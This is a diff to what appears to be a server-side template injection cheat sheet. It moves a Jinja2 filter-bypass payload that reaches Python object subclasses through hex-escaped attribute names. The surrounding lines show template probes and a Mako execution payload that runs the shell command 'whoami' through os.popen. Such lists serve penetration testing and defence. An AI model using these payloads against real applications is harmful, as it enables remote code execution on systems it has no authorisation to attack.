@@ -140,14 +140,13 @@ ${{7*7}}
 ${7*7}
 ```
 
-### jinja2 filter bypass
-```
-{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')() }}
-```
-
 **Execution Payload**:
 ```python
 ${self.module.cache.util.os.popen("whoami").read()}
 ```
 
+### jinja2 filter bypass
+```
+{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')() }}
+```
 ---
